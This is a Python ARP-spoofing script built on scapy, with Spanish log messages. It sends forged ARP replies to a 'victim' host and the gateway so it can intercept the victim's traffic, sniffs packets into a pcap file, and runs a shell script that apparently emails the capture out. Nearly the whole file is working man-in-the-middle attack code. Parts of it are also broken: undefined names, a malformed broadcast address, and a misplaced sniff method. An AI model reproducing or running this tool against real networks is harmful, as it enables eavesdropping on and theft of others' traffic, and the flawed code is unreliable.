import datetime
from warnings import filterwarnings
filterwarnings("ignore")
import argparse
import subprocess
import logging
from os import *
import shutil
import sys
import time
from multiprocessing import Process
import keys
from scapy.all import *
def get_mac(targetip):
	packet = Ether(dst='ff:ff:ff:ff:ff:ff:ff')/ARP(op='who-has', pdst=targetip)
	resp, _ = srp(packet, timeout=2, retry=10, verbose=False)
	for _, r in resp:
		return r[Ether].src
	return None
class Arper():
	def __init__(self, victim, gateway, interface='eth0'):
		self.victim = victim
		self.victimmac = get_mac(victim)
		self.gateway = gateway
		self.gatewaymac = get_mac(gateway)
		self.interface = interface
		conf.iface = interface
		conf.verb = 0
		logger.info('Inicio del script..')
		logger.info(today)
		logger.info(f'Inicialiado {interface}:')
		logger.info(f'Puerta de enlace ({gateway}) esta en {self.gatewaymac}.')
		logger.info(f'La victima ({victim}) esta en {self.victimmac}.')
		logger.info('-'*30)

	def run(self):
		self.poison_thread = Process(target=self.poison)
		self.poison_thread.start()

	def poison(self, count=20):
		poison_victim = ARP()
		poison_victim.op = 2
		poison_victim.psrc = self.gateway
		poison_victim.pdst = self.victim
		poison_victim.hwdst = self.victimmac
		logger.info(f'ip src: {poison_victim.psrc}')
		logger.info(f'ip dst: {poison_victim.pdst}')
		logger.info(f'mac dst: {poison_victim.hwdst}')
		logger.info(f'mac src: {poison_victim.hwsrc}')
		logger.info(poison_victim.summary())
		logger.info('-'*30)
		poison_gateway = ARP()
		poison_gateway.op = 2
		poison_gateway.psrc = self.victim
		poison_gateway.pdst = self.gateway
		poison_gateway.hwdst = self.gatewaymac
		logger.info(f'ip src: {poison_gateway.psrc}')
		logger.info(f'ip dst: {poison_gateway.pdst}')
		logger.info(f'mac dst: {poison_gateway.hwdst}')
		logger.info(f'mac_src: {poison_gateway.hwsrc}')
		logger.info(poison_gateway.summary())
		logger.info('-'*30)
		logger.info(f'Iniciando envenenamiento ARP')
		time.sleep(2)
		logger.info(f'Sniffing {count} packets...')
		x=0
		while x<=20:
			while True:
				x+=1
				sys.stdout.write('.')
				sys.stdout.flush()
				try:
					send(poison_victim)
					send(poison_gateway)
					if x>20:
						break
				except:
					if x > 20:
						self.restore()
						sys.exit()
				else:
					time.sleep(1)
					if x > 20:
						break
			if x >20:
				self.restore()
				break
		def sniff(self, count=20):
			time.sleep(1)
			bpf_filter = "ip host %s" % victim
			packets = sniff(count=count, filter=bpf_filter, iface=self.interface)
			wrpcap('arper.pcap', packets)
			logger.info('Obteniedo paquetes')
			self.restore()
			logger.info('Finalizado')
			time.sleep(2)
	def restore(self):
		logger.info('\nRestaurando tablas ARP')
		time.sleep(1)
		logger.info('\nTablas ARP restauradas...')

		try:
			time.sleep(1)
			logger.info('Enviando reporte al mail...')
			time.sleep(2)
			subprocess.run('./sender.sh', shell=True)
			logger.info('Reporte enviado exitosamente!...')
			time.sleep(2)
		except:
			print('Reporte fallido, intente de nuevo...')

		send(ARP(
				op=2,
				psrc=self.gateway,
				hwsrc=self.gatewaymac,
				pdst=self.victim,
				hwdst='ff:ff:ff:ff:ff:ff'),
			count=5)
		send(ARP(
				op=2,
				psrc=self.victim,
				hwsrc=self.victimmac,
				pdst=self.gateway,
				hwdst='ff:ff:ff:ff:ff:ff'),
			count=5)
if __name__ == '__main__':
	(victim, gateway, interface) = (sys.argv[1], sys.argv[2], sys.argv[3])
	myarp = Arper(victim, gateway, interface)
	myarp.run()